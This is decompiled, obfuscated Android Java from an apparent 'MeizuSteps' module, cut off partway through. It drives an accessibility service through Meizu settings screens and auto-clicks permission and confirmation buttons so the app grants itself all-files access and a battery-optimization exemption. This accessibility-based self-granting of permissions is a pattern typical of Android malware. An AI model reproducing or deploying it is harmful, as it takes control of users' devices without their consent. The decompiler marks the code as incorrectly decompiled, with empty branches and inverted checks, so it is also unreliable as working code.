package com.storm.safe.rock.service.modules.yw5xud;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.graphics.Rect;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.PowerManager;
import android.provider.Settings;
import android.view.accessibility.AccessibilityNodeInfo;
import com.storm.safe.rock.service.dqtvuisjd;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.LinkedHashMap;
import java.util.List;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.ContinuationImpl;
import kotlin.text.AbstractC0779a1;
import org.conscrypt.FileClientSessionCache;
import p000.AbstractC0003a2;
import p000.AbstractC0715je;
import p000.AbstractC0716jf;
import p000.AbstractC1117qo;
import p000.C1351vv;
import p000.b81;
import p000.h10;
import p000.kg1;
import p000.oe0;
import p000.t60;
import p000.tz0;
import p000.w20;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: com.storm.safe.rock.service.modules.yw5xud.a3 */
/* loaded from: classes2.dex */
public final class C0366a3 {

    /* renamed from: a0 */
    public final dqtvuisjd f55081a0;

    /* renamed from: a1 */
    public final Context f55082a1;

    /* renamed from: a2 */
    public final String f55083a2;

    /* renamed from: a3 */
    public final w20 f55084a3;

    /* renamed from: a4 */
    public final String f55085a4;

    public C0366a3(dqtvuisjd dqtvuisjdVar, Context context, String str) {
        t60.m214695b6(dqtvuisjdVar, "service");
        t60.m214695b6(context, "context");
        t60.m214695b6(str, "LOG_TAG");
        this.f55081a0 = dqtvuisjdVar;
        this.f55082a1 = context;
        this.f55083a2 = str;
        this.f55084a3 = new w20(this);
        this.f55085a4 = "com.meizu.safe";
    }

    /* JADX WARN: Removed duplicated region for block: B:30:0x009e  */
    /* JADX WARN: Removed duplicated region for block: B:40:0x00ea  */
    /* JADX WARN: Removed duplicated region for block: B:45:0x010b  */
    /* JADX WARN: Removed duplicated region for block: B:50:0x0128  */
    /* JADX WARN: Removed duplicated region for block: B:52:0x012b  */
    /* JADX WARN: Removed duplicated region for block: B:53:0x012f  */
    /* JADX WARN: Removed duplicated region for block: B:59:0x014b  */
    /* JADX WARN: Removed duplicated region for block: B:60:0x014e  */
    /* JADX WARN: Removed duplicated region for block: B:66:0x016a  */
    /* JADX WARN: Removed duplicated region for block: B:69:0x0173  */
    /* JADX WARN: Removed duplicated region for block: B:70:0x0176  */
    /* JADX WARN: Removed duplicated region for block: B:75:0x0188  */
    /* JADX WARN: Removed duplicated region for block: B:76:0x0190  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x001a  */
    /* JADX WARN: Removed duplicated region for block: B:86:? A[RETURN, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:89:? A[RETURN, SYNTHETIC] */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:47:0x011f -> B:17:0x0061). Please report as a decompilation issue!!! */
    /* renamed from: a0 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static final Object m212218a0(C0366a3 c0366a3, String str, ContinuationImpl continuationImpl) throws Throwable {
        MeizuSteps$executeAllFilesAccessInternal$1 meizuSteps$executeAllFilesAccessInternal$1;
        String str2;
        int i;
        int i2;
        int i3;
        int i4;
        String str3;
        C0366a3 c0366a32;
        C0366a3 c0366a33;
        String str4;
        boolean z;
        C0366a3 c0366a34;
        C0366a3 c0366a35 = c0366a3;
        c0366a35.getClass();
        if (continuationImpl instanceof MeizuSteps$executeAllFilesAccessInternal$1) {
            meizuSteps$executeAllFilesAccessInternal$1 = (MeizuSteps$executeAllFilesAccessInternal$1) continuationImpl;
            int i5 = meizuSteps$executeAllFilesAccessInternal$1.f54221a6;
            if ((i5 & Integer.MIN_VALUE) != 0) {
                meizuSteps$executeAllFilesAccessInternal$1.f54221a6 = i5 - Integer.MIN_VALUE;
            } else {
                meizuSteps$executeAllFilesAccessInternal$1 = new MeizuSteps$executeAllFilesAccessInternal$1(c0366a35, continuationImpl);
            }
        }
        Object objM212225a5 = meizuSteps$executeAllFilesAccessInternal$1.f54219a4;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i6 = meizuSteps$executeAllFilesAccessInternal$1.f54221a6;
        MeizuSteps$FlowType meizuSteps$FlowType = MeizuSteps$FlowType.ALL_FILES_ACCESS;
        int i7 = 1;
        switch (i6) {
            case 0:
                kg1.m213544f4(objM212225a5);
                if (Build.VERSION.SDK_INT < 30) {
                    return Boolean.TRUE;
                }
                if (Environment.isExternalStorageManager()) {
                    c0366a35.f55084a3.m214995b0(meizuSteps$FlowType);
                    return Boolean.TRUE;
                }
                str2 = str;
                i = 0;
                i2 = 0;
                if (i < 5) {
                    meizuSteps$executeAllFilesAccessInternal$1.f54215a0 = c0366a35;
                    meizuSteps$executeAllFilesAccessInternal$1.f54216a1 = str2;
                    meizuSteps$executeAllFilesAccessInternal$1.f54217a2 = i2;
                    meizuSteps$executeAllFilesAccessInternal$1.f54218a3 = i;
                    meizuSteps$executeAllFilesAccessInternal$1.f54221a6 = 1;
                    Context context = c0366a35.f55082a1;
                    try {
                    } catch (Exception unused) {
                        z = false;
                    }
                    Intent intent = new Intent("android.settings.MANAGE_APP_ALL_FILES_ACCESS_PERMISSION");
                    intent.setData(Uri.parse("package:" + context.getPackageName()));
                    intent.setFlags(276824064);
                    context.startActivity(intent);
                    z = true;
                    Boolean boolValueOf = Boolean.valueOf(z);
                    if (boolValueOf == coroutineSingletons) {
                        return coroutineSingletons;
                    }
                    c0366a32 = c0366a35;
                    i3 = i;
                    i4 = i2;
                    str3 = str2;
                    objM212225a5 = boolValueOf;
                    if (((Boolean) objM212225a5).booleanValue()) {
                        meizuSteps$executeAllFilesAccessInternal$1.f54215a0 = c0366a32;
                        meizuSteps$executeAllFilesAccessInternal$1.f54216a1 = str3;
                        meizuSteps$executeAllFilesAccessInternal$1.f54217a2 = i4;
                        meizuSteps$executeAllFilesAccessInternal$1.f54218a3 = i3;
                        meizuSteps$executeAllFilesAccessInternal$1.f54221a6 = 2;
                        if (b81.m210571b1(1000L, meizuSteps$executeAllFilesAccessInternal$1) == coroutineSingletons) {
                            return coroutineSingletons;
                        }
                        if (c0366a32.m212234b6("文件访问页面", AbstractC1117qo.m214451e7("settings"))) {
                            str2 = str3;
                            c0366a35 = c0366a32;
                            if (i7 != 0) {
                                return Boolean.FALSE;
                            }
                            meizuSteps$executeAllFilesAccessInternal$1.f54215a0 = c0366a35;
                            meizuSteps$executeAllFilesAccessInternal$1.f54216a1 = str2;
                            meizuSteps$executeAllFilesAccessInternal$1.f54221a6 = 4;
                            Object objM212231b3 = c0366a35.m212231b3(str2, meizuSteps$executeAllFilesAccessInternal$1);
                            if (objM212231b3 == coroutineSingletons) {
                                return coroutineSingletons;
                            }
                            c0366a33 = c0366a35;
                            str4 = str2;
                            objM212225a5 = objM212231b3;
                            if (((Boolean) objM212225a5).booleanValue()) {
                                return Boolean.FALSE;
                            }
                            meizuSteps$executeAllFilesAccessInternal$1.f54215a0 = c0366a33;
                            meizuSteps$executeAllFilesAccessInternal$1.f54216a1 = str4;
                            meizuSteps$executeAllFilesAccessInternal$1.f54221a6 = 5;
                            if (b81.m210571b1(1000L, meizuSteps$executeAllFilesAccessInternal$1) == coroutineSingletons) {
                                return coroutineSingletons;
                            }
                            meizuSteps$executeAllFilesAccessInternal$1.f54215a0 = c0366a33;
                            meizuSteps$executeAllFilesAccessInternal$1.f54216a1 = null;
                            meizuSteps$executeAllFilesAccessInternal$1.f54221a6 = 6;
                            objM212225a5 = c0366a33.m212225a5(str4, meizuSteps$executeAllFilesAccessInternal$1);
                            if (objM212225a5 != coroutineSingletons) {
                                return coroutineSingletons;
                            }
                            c0366a34 = c0366a33;
                            if (((Boolean) objM212225a5).booleanValue()) {
                                return Boolean.FALSE;
                            }
                            meizuSteps$executeAllFilesAccessInternal$1.f54215a0 = c0366a34;
                            meizuSteps$executeAllFilesAccessInternal$1.f54221a6 = 7;
                            if (b81.m210571b1(1000L, meizuSteps$executeAllFilesAccessInternal$1) == coroutineSingletons) {
                                return coroutineSingletons;
                            }
                            if (Environment.isExternalStorageManager()) {
                                return Boolean.FALSE;
                            }
                            c0366a34.f55084a3.m214995b0(meizuSteps$FlowType);
                            return Boolean.TRUE;
                        }
                    }
                    meizuSteps$executeAllFilesAccessInternal$1.f54215a0 = c0366a32;
                    meizuSteps$executeAllFilesAccessInternal$1.f54216a1 = str3;
                    meizuSteps$executeAllFilesAccessInternal$1.f54217a2 = i4;
                    meizuSteps$executeAllFilesAccessInternal$1.f54218a3 = i3;
                    meizuSteps$executeAllFilesAccessInternal$1.f54221a6 = 3;
                    if (b81.m210571b1(500L, meizuSteps$executeAllFilesAccessInternal$1) == coroutineSingletons) {
                        return coroutineSingletons;
                    }
                    str2 = str3;
                    i2 = i4;
                    i = i3 + 1;
                    c0366a35 = c0366a32;
                    if (i < 5) {
                        i7 = i2;
                        if (i7 != 0) {
                        }
                    }
                }
            case 1:
                i3 = meizuSteps$executeAllFilesAccessInternal$1.f54218a3;
                i4 = meizuSteps$executeAllFilesAccessInternal$1.f54217a2;
                str3 = meizuSteps$executeAllFilesAccessInternal$1.f54216a1;
                c0366a32 = meizuSteps$executeAllFilesAccessInternal$1.f54215a0;
                kg1.m213544f4(objM212225a5);
                if (((Boolean) objM212225a5).booleanValue()) {
                }
                meizuSteps$executeAllFilesAccessInternal$1.f54215a0 = c0366a32;
                meizuSteps$executeAllFilesAccessInternal$1.f54216a1 = str3;
                meizuSteps$executeAllFilesAccessInternal$1.f54217a2 = i4;
                meizuSteps$executeAllFilesAccessInternal$1.f54218a3 = i3;
                meizuSteps$executeAllFilesAccessInternal$1.f54221a6 = 3;
                if (b81.m210571b1(500L, meizuSteps$executeAllFilesAccessInternal$1) == coroutineSingletons) {
                }
                str2 = str3;
                i2 = i4;
                i = i3 + 1;
                c0366a35 = c0366a32;
                if (i < 5) {
                }
                break;
            case 2:
                i3 = meizuSteps$executeAllFilesAccessInternal$1.f54218a3;
                i4 = meizuSteps$executeAllFilesAccessInternal$1.f54217a2;
                str3 = meizuSteps$executeAllFilesAccessInternal$1.f54216a1;
                c0366a32 = meizuSteps$executeAllFilesAccessInternal$1.f54215a0;
                kg1.m213544f4(objM212225a5);
                if (c0366a32.m212234b6("文件访问页面", AbstractC1117qo.m214451e7("settings"))) {
                }
                meizuSteps$executeAllFilesAccessInternal$1.f54215a0 = c0366a32;
                meizuSteps$executeAllFilesAccessInternal$1.f54216a1 = str3;
                meizuSteps$executeAllFilesAccessInternal$1.f54217a2 = i4;
                meizuSteps$executeAllFilesAccessInternal$1.f54218a3 = i3;
                meizuSteps$executeAllFilesAccessInternal$1.f54221a6 = 3;
                if (b81.m210571b1(500L, meizuSteps$executeAllFilesAccessInternal$1) == coroutineSingletons) {
                }
                str2 = str3;
                i2 = i4;
                i = i3 + 1;
                c0366a35 = c0366a32;
                if (i < 5) {
                }
                break;
            case 3:
                i3 = meizuSteps$executeAllFilesAccessInternal$1.f54218a3;
                i4 = meizuSteps$executeAllFilesAccessInternal$1.f54217a2;
                str3 = meizuSteps$executeAllFilesAccessInternal$1.f54216a1;
                c0366a32 = meizuSteps$executeAllFilesAccessInternal$1.f54215a0;
                kg1.m213544f4(objM212225a5);
                str2 = str3;
                i2 = i4;
                i = i3 + 1;
                c0366a35 = c0366a32;
                if (i < 5) {
                }
                break;
            case 4:
                str4 = meizuSteps$executeAllFilesAccessInternal$1.f54216a1;
                c0366a33 = meizuSteps$executeAllFilesAccessInternal$1.f54215a0;
                kg1.m213544f4(objM212225a5);
                if (((Boolean) objM212225a5).booleanValue()) {
                }
                break;
            case 5:
                str4 = meizuSteps$executeAllFilesAccessInternal$1.f54216a1;
                c0366a33 = meizuSteps$executeAllFilesAccessInternal$1.f54215a0;
                kg1.m213544f4(objM212225a5);
                meizuSteps$executeAllFilesAccessInternal$1.f54215a0 = c0366a33;
                meizuSteps$executeAllFilesAccessInternal$1.f54216a1 = null;
                meizuSteps$executeAllFilesAccessInternal$1.f54221a6 = 6;
                objM212225a5 = c0366a33.m212225a5(str4, meizuSteps$executeAllFilesAccessInternal$1);
                if (objM212225a5 != coroutineSingletons) {
                }
                break;
            case 6:
                c0366a34 = meizuSteps$executeAllFilesAccessInternal$1.f54215a0;
                kg1.m213544f4(objM212225a5);
                if (((Boolean) objM212225a5).booleanValue()) {
                }
                break;
            case 7:
                c0366a34 = meizuSteps$executeAllFilesAccessInternal$1.f54215a0;
                kg1.m213544f4(objM212225a5);
                if (Environment.isExternalStorageManager()) {
                }
                break;
            default:
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:103:0x0221  */
    /* JADX WARN: Removed duplicated region for block: B:104:0x0225  */
    /* JADX WARN: Removed duplicated region for block: B:138:0x02d5  */
    /* JADX WARN: Removed duplicated region for block: B:139:0x02d9  */
    /* JADX WARN: Removed duplicated region for block: B:144:0x02f7  */
    /* JADX WARN: Removed duplicated region for block: B:145:0x02fb  */
    /* JADX WARN: Removed duplicated region for block: B:178:0x03aa  */
    /* JADX WARN: Removed duplicated region for block: B:179:0x03b4  */
    /* JADX WARN: Removed duplicated region for block: B:235:? A[RETURN, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:237:? A[RETURN, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:239:? A[RETURN, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:241:? A[RETURN, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:242:? A[RETURN, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:33:0x00cd  */
    /* JADX WARN: Removed duplicated region for block: B:34:0x00d1  */
    /* JADX WARN: Removed duplicated region for block: B:40:0x00f2  */
    /* JADX WARN: Removed duplicated region for block: B:41:0x00f6  */
    /* JADX WARN: Removed duplicated region for block: B:46:0x010d  */
    /* JADX WARN: Removed duplicated region for block: B:47:0x0111  */
    /* JADX WARN: Removed duplicated region for block: B:55:0x0137  */
    /* JADX WARN: Removed duplicated region for block: B:56:0x013b  */
    /* JADX WARN: Removed duplicated region for block: B:61:0x015a  */
    /* JADX WARN: Removed duplicated region for block: B:63:0x015f  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x001a  */
    /* JADX WARN: Removed duplicated region for block: B:87:0x01d9  */
    /* JADX WARN: Removed duplicated region for block: B:94:0x01f6  */
    /* JADX WARN: Removed duplicated region for block: B:97:0x01ff  */
    /* JADX WARN: Removed duplicated region for block: B:98:0x0203  */
    /* renamed from: a1 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static final Object m212219a1(C0366a3 c0366a3, String str, ContinuationImpl continuationImpl) {
        MeizuSteps$executeBatteryOptimizationInternal$1 meizuSteps$executeBatteryOptimizationInternal$1;
        String str2;
        boolean z;
        Object objValueOf;
        C0366a3 c0366a32;
        String str3;
        AccessibilityNodeInfo rootInActiveWindow;
        int size;
        int i;
        boolean zPerformAction;
        Boolean boolValueOf;
        C0366a3 c0366a33;
        AccessibilityNodeInfo rootInActiveWindow2;
        Object next;
        AccessibilityNodeInfo rootInActiveWindow3;
        Boolean bool;
        Object next2;
        C0366a3 c0366a34 = c0366a3;
        c0366a34.getClass();
        if (continuationImpl instanceof MeizuSteps$executeBatteryOptimizationInternal$1) {
            meizuSteps$executeBatteryOptimizationInternal$1 = (MeizuSteps$executeBatteryOptimizationInternal$1) continuationImpl;
            int i2 = meizuSteps$executeBatteryOptimizationInternal$1.f54226a4;
            if ((i2 & Integer.MIN_VALUE) != 0) {
                meizuSteps$executeBatteryOptimizationInternal$1.f54226a4 = i2 - Integer.MIN_VALUE;
            } else {
                meizuSteps$executeBatteryOptimizationInternal$1 = new MeizuSteps$executeBatteryOptimizationInternal$1(c0366a34, continuationImpl);
            }
        }
        Object objM212224a4 = meizuSteps$executeBatteryOptimizationInternal$1.f54224a2;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        boolean zIsIgnoringBatteryOptimizations = false;
        switch (meizuSteps$executeBatteryOptimizationInternal$1.f54226a4) {
            case 0:
                kg1.m213544f4(objM212224a4);
                meizuSteps$executeBatteryOptimizationInternal$1.f54222a0 = c0366a34;
                str2 = str;
                meizuSteps$executeBatteryOptimizationInternal$1.f54223a1 = str2;
                meizuSteps$executeBatteryOptimizationInternal$1.f54226a4 = 1;
                try {
                    Intent intent = new Intent("android.settings.IGNORE_BATTERY_OPTIMIZATION_SETTINGS");
                    intent.setFlags(276824064);
                    c0366a34.f55082a1.startActivity(intent);
                    z = true;
                } catch (Exception unused) {
                    z = false;
                }
                objValueOf = Boolean.valueOf(z);
                if (objValueOf == coroutineSingletons) {
                    return coroutineSingletons;
                }
                if (((Boolean) objValueOf).booleanValue()) {
                    return Boolean.FALSE;
                }
                meizuSteps$executeBatteryOptimizationInternal$1.f54222a0 = c0366a34;
                meizuSteps$executeBatteryOptimizationInternal$1.f54223a1 = str2;
                meizuSteps$executeBatteryOptimizationInternal$1.f54226a4 = 2;
                if (b81.m210571b1(2000L, meizuSteps$executeBatteryOptimizationInternal$1) == coroutineSingletons) {
                    return coroutineSingletons;
                }
                c0366a32 = c0366a34;
                str3 = str2;
                if (c0366a32.m212234b6("电池优化页面", AbstractC1117qo.m214451e7("settings"))) {
                    return Boolean.FALSE;
                }
                meizuSteps$executeBatteryOptimizationInternal$1.f54222a0 = c0366a32;
                meizuSteps$executeBatteryOptimizationInternal$1.f54223a1 = str3;
                meizuSteps$executeBatteryOptimizationInternal$1.f54226a4 = 3;
                objM212224a4 = c0366a32.m212224a4(meizuSteps$executeBatteryOptimizationInternal$1);
                if (objM212224a4 == coroutineSingletons) {
                    return coroutineSingletons;
                }
                if (((Boolean) objM212224a4).booleanValue()) {
                    return Boolean.FALSE;
                }
                meizuSteps$executeBatteryOptimizationInternal$1.f54222a0 = c0366a32;
                meizuSteps$executeBatteryOptimizationInternal$1.f54223a1 = str3;
                meizuSteps$executeBatteryOptimizationInternal$1.f54226a4 = 4;
                if (b81.m210571b1(1000L, meizuSteps$executeBatteryOptimizationInternal$1) == coroutineSingletons) {
                    return coroutineSingletons;
                }
                meizuSteps$executeBatteryOptimizationInternal$1.f54222a0 = c0366a32;
                meizuSteps$executeBatteryOptimizationInternal$1.f54223a1 = str3;
                meizuSteps$executeBatteryOptimizationInternal$1.f54226a4 = 5;
                objM212224a4 = c0366a32.m212230b2(str3, meizuSteps$executeBatteryOptimizationInternal$1);
                if (objM212224a4 == coroutineSingletons) {
                    return coroutineSingletons;
                }
                if (!((Boolean) objM212224a4).booleanValue()) {
                    return Boolean.FALSE;
                }
                meizuSteps$executeBatteryOptimizationInternal$1.f54222a0 = c0366a32;
                meizuSteps$executeBatteryOptimizationInternal$1.f54223a1 = str3;
                meizuSteps$executeBatteryOptimizationInternal$1.f54226a4 = 6;
                if (b81.m210571b1(1000L, meizuSteps$executeBatteryOptimizationInternal$1) == coroutineSingletons) {
                    return coroutineSingletons;
                }
                meizuSteps$executeBatteryOptimizationInternal$1.f54222a0 = c0366a32;
                meizuSteps$executeBatteryOptimizationInternal$1.f54223a1 = null;
                meizuSteps$executeBatteryOptimizationInternal$1.f54226a4 = 7;
                String str4 = c0366a32.f55083a2;
                rootInActiveWindow = c0366a32.f55081a0.getRootInActiveWindow();
                if (rootInActiveWindow != null) {
                    boolValueOf = Boolean.FALSE;
                } else {
                    t60.m214695b6(str3, "text");
                    if (b81.m210572b2(rootInActiveWindow, str3, "[Meizu-电池优化]") == null) {
                        t60.m214704c5(str4, "[电池优化] 未找到精确匹配的应用'" + str3 + "'");
                        rootInActiveWindow.recycle();
                        boolValueOf = Boolean.FALSE;
                    } else {
                        tz0.m214809a9("[电池优化] 找到精确匹配的应用'", str3, "'", str4);
                        AccessibilityNodeInfo accessibilityNodeInfoM210572b2 = b81.m210572b2(rootInActiveWindow, str3, "[Meizu-电池优化]");
                        if (accessibilityNodeInfoM210572b2 == null) {
                            zPerformAction = false;
                        } else if (accessibilityNodeInfoM210572b2.isClickable()) {
                            zPerformAction = accessibilityNodeInfoM210572b2.performAction(16);
                        } else {
                            ArrayList arrayList = new ArrayList();
                            AccessibilityNodeInfo parent = accessibilityNodeInfoM210572b2;
                            for (int i3 = 1; i3 < 6; i3++) {
                                parent = parent.getParent();
                                if (parent == null) {
                                    size = arrayList.size();
                                    i = 0;
                                    while (i < size) {
                                        Object obj = arrayList.get(i);
                                        i++;
                                        try {
                                            ((AccessibilityNodeInfo) obj).recycle();
                                        } catch (Exception unused2) {
                                        }
                                    }
                                    zPerformAction = accessibilityNodeInfoM210572b2.performAction(16);
                                } else {
                                    arrayList.add(parent);
                                    if (parent.isClickable()) {
                                        zPerformAction = parent.performAction(16);
                                        int size2 = arrayList.size();
                                        int i4 = 0;
                                        while (i4 < size2) {
                                            Object obj2 = arrayList.get(i4);
                                            i4++;
                                            try {
                                                ((AccessibilityNodeInfo) obj2).recycle();
                                            } catch (Exception unused3) {
                                            }
                                        }
                                    }
                                }
                            }
                            size = arrayList.size();
                            i = 0;
                            while (i < size) {
                            }
                            zPerformAction = accessibilityNodeInfoM210572b2.performAction(16);
                        }
                        rootInActiveWindow.recycle();
                        boolValueOf = Boolean.valueOf(zPerformAction);
                    }
                }
                objM212224a4 = boolValueOf;
                if (objM212224a4 != coroutineSingletons) {
                    return coroutineSingletons;
                }
                c0366a33 = c0366a32;
                if (((Boolean) objM212224a4).booleanValue()) {
                    return Boolean.FALSE;
                }
                meizuSteps$executeBatteryOptimizationInternal$1.f54222a0 = c0366a33;
                meizuSteps$executeBatteryOptimizationInternal$1.f54226a4 = 8;
                if (b81.m210571b1(1500L, meizuSteps$executeBatteryOptimizationInternal$1) == coroutineSingletons) {
                    return coroutineSingletons;
                }
                meizuSteps$executeBatteryOptimizationInternal$1.f54222a0 = c0366a33;
                meizuSteps$executeBatteryOptimizationInternal$1.f54226a4 = 9;
                rootInActiveWindow2 = c0366a33.f55081a0.getRootInActiveWindow();
                if (rootInActiveWindow2 != null) {
                    objM212224a4 = Boolean.FALSE;
                } else {
                    Iterator it = AbstractC0716jf.m213306g5("不允许", "不优化", "无限制").iterator();
                    while (true) {
                        if (it.hasNext()) {
                            List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow2.findAccessibilityNodeInfosByText((String) it.next());
                            t60.m214694b5(listFindAccessibilityNodeInfosByText, "nodes");
                            Iterator<T> it2 = listFindAccessibilityNodeInfosByText.iterator();
                            while (true) {
                                if (it2.hasNext()) {
                                    next = it2.next();
                                    AccessibilityNodeInfo accessibilityNodeInfo = (AccessibilityNodeInfo) next;
                                    if (!accessibilityNodeInfo.isClickable() || !accessibilityNodeInfo.isVisibleToUser() || (!AbstractC0779a1.m213652a5(accessibilityNodeInfo.getClassName().toString(), "CheckedTextView", false) && !AbstractC0779a1.m213652a5(accessibilityNodeInfo.getClassName().toString(), "RadioButton", false))) {
                                    }
                                } else {
                                    next = null;
                                }
                            }
                            AccessibilityNodeInfo accessibilityNodeInfo2 = (AccessibilityNodeInfo) next;
                            if (accessibilityNodeInfo2 != null) {
                                boolean zPerformAction2 = accessibilityNodeInfo2.performAction(16);
                                accessibilityNodeInfo2.recycle();
                                Iterator<T> it3 = listFindAccessibilityNodeInfosByText.iterator();
                                while (it3.hasNext()) {
                                    ((AccessibilityNodeInfo) it3.next()).recycle();
                                }
                                rootInActiveWindow2.recycle();
                                if (zPerformAction2) {
                                    objM212224a4 = Boolean.TRUE;
                                }
                            }
                            Iterator<T> it4 = listFindAccessibilityNodeInfosByText.iterator();
                            while (it4.hasNext()) {
                                ((AccessibilityNodeInfo) it4.next()).recycle();
                            }
                        } else {
                            rootInActiveWindow2.recycle();
                            objM212224a4 = Boolean.FALSE;
                        }
                    }
                }
                if (objM212224a4 == coroutineSingletons) {
                    return coroutineSingletons;
                }
                if (!((Boolean) objM212224a4).booleanValue()) {
                    return Boolean.FALSE;
                }
                meizuSteps$executeBatteryOptimizationInternal$1.f54222a0 = c0366a33;
                meizuSteps$executeBatteryOptimizationInternal$1.f54226a4 = 10;
                if (b81.m210571b1(500L, meizuSteps$executeBatteryOptimizationInternal$1) == coroutineSingletons) {
                    return coroutineSingletons;
                }
                meizuSteps$executeBatteryOptimizationInternal$1.f54222a0 = c0366a33;
                meizuSteps$executeBatteryOptimizationInternal$1.f54226a4 = 11;
                rootInActiveWindow3 = c0366a33.f55081a0.getRootInActiveWindow();
                if (rootInActiveWindow3 != null) {
                    bool = Boolean.FALSE;
                } else {
                    Iterator it5 = AbstractC0716jf.m213306g5("确定", "允许", "确认").iterator();
                    while (true) {
                        if (it5.hasNext()) {
                            List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText2 = rootInActiveWindow3.findAccessibilityNodeInfosByText((String) it5.next());
                            t60.m214694b5(listFindAccessibilityNodeInfosByText2, "nodes");
                            Iterator<T> it6 = listFindAccessibilityNodeInfosByText2.iterator();
                            while (true) {
                                if (it6.hasNext()) {
                                    next2 = it6.next();
                                    AccessibilityNodeInfo accessibilityNodeInfo3 = (AccessibilityNodeInfo) next2;
                                    if (!accessibilityNodeInfo3.isClickable() || !accessibilityNodeInfo3.isVisibleToUser()) {
                                    }
                                } else {
                                    next2 = null;
                                }
                            }
                            AccessibilityNodeInfo accessibilityNodeInfo4 = (AccessibilityNodeInfo) next2;
                            if (accessibilityNodeInfo4 != null) {
                                boolean zPerformAction3 = accessibilityNodeInfo4.performAction(16);
                                accessibilityNodeInfo4.recycle();
                                Iterator<T> it7 = listFindAccessibilityNodeInfosByText2.iterator();
                                while (it7.hasNext()) {
                                    ((AccessibilityNodeInfo) it7.next()).recycle();
                                }
                                rootInActiveWindow3.recycle();
                                if (zPerformAction3) {
                                    bool = Boolean.TRUE;
                                }
                            }
                            Iterator<T> it8 = listFindAccessibilityNodeInfosByText2.iterator();
                            while (it8.hasNext()) {
                                ((AccessibilityNodeInfo) it8.next()).recycle();
                            }
                        } else {
                            rootInActiveWindow3.recycle();
                            bool = Boolean.FALSE;
                        }
                    }
                }
                if (bool == coroutineSingletons) {
                    return coroutineSingletons;
                }
                meizuSteps$executeBatteryOptimizationInternal$1.f54222a0 = c0366a33;
                meizuSteps$executeBatteryOptimizationInternal$1.f54226a4 = 12;
                if (b81.m210571b1(1000L, meizuSteps$executeBatteryOptimizationInternal$1) == coroutineSingletons) {
                    return coroutineSingletons;
                }
                try {
                    Object systemService = c0366a33.f55082a1.getSystemService("power");
                    t60.m214693b4(systemService, "null cannot be cast to non-null type android.os.PowerManager");
                    zIsIgnoringBatteryOptimizations = ((PowerManager) systemService).isIgnoringBatteryOptimizations(c0366a33.f55082a1.getPackageName());
                } catch (Exception unused4) {
                }
                if (zIsIgnoringBatteryOptimizations) {
                    return Boolean.FALSE;
                }
                c0366a33.f55084a3.m214995b0(MeizuSteps$FlowType.BATTERY_OPTIMIZATION);
                return Boolean.TRUE;
            case 1:
                String str5 = meizuSteps$executeBatteryOptimizationInternal$1.f54223a1;
                C0366a3 c0366a35 = meizuSteps$executeBatteryOptimizationInternal$1.f54222a0;
                kg1.m213544f4(objM212224a4);
                str2 = str5;
                c0366a34 = c0366a35;
                objValueOf = objM212224a4;
                if (((Boolean) objValueOf).booleanValue()) {
                }
                break;
            case 2:
                str3 = meizuSteps$executeBatteryOptimizationInternal$1.f54223a1;
                c0366a32 = meizuSteps$executeBatteryOptimizationInternal$1.f54222a0;
                kg1.m213544f4(objM212224a4);
                if (c0366a32.m212234b6("电池优化页面", AbstractC1117qo.m214451e7("settings"))) {
                }
                break;
            case 3:
                str3 = meizuSteps$executeBatteryOptimizationInternal$1.f54223a1;
                c0366a32 = meizuSteps$executeBatteryOptimizationInternal$1.f54222a0;
                kg1.m213544f4(objM212224a4);
                if (((Boolean) objM212224a4).booleanValue()) {
                }
                break;
            case 4:
                str3 = meizuSteps$executeBatteryOptimizationInternal$1.f54223a1;
                c0366a32 = meizuSteps$executeBatteryOptimizationInternal$1.f54222a0;
                kg1.m213544f4(objM212224a4);
                meizuSteps$executeBatteryOptimizationInternal$1.f54222a0 = c0366a32;
                meizuSteps$executeBatteryOptimizationInternal$1.f54223a1 = str3;
                meizuSteps$executeBatteryOptimizationInternal$1.f54226a4 = 5;
                objM212224a4 = c0366a32.m212230b2(str3, meizuSteps$executeBatteryOptimizationInternal$1);
                if (objM212224a4 == coroutineSingletons) {
                }
                if (!((Boolean) objM212224a4).booleanValue()) {
                }
                break;
            case 5:
                str3 = meizuSteps$executeBatteryOptimizationInternal$1.f54223a1;
                c0366a32 = meizuSteps$executeBatteryOptimizationInternal$1.f54222a0;
                kg1.m213544f4(objM212224a4);
                if (!((Boolean) objM212224a4).booleanValue()) {
                }
                break;
            case 6:
                str3 = meizuSteps$executeBatteryOptimizationInternal$1.f54223a1;
                c0366a32 = meizuSteps$executeBatteryOptimizationInternal$1.f54222a0;
                kg1.m213544f4(objM212224a4);
                meizuSteps$executeBatteryOptimizationInternal$1.f54222a0 = c0366a32;
                meizuSteps$executeBatteryOptimizationInternal$1.f54223a1 = null;
                meizuSteps$executeBatteryOptimizationInternal$1.f54226a4 = 7;
                String str42 = c0366a32.f55083a2;
                rootInActiveWindow = c0366a32.f55081a0.getRootInActiveWindow();
                if (rootInActiveWindow != null) {
                }
                objM212224a4 = boolValueOf;
                if (objM212224a4 != coroutineSingletons) {
                }
                break;
            case 7:
                c0366a33 = meizuSteps$executeBatteryOptimizationInternal$1.f54222a0;
                kg1.m213544f4(objM212224a4);
                if (((Boolean) objM212224a4).booleanValue()) {
                }
                break;
            case 8:
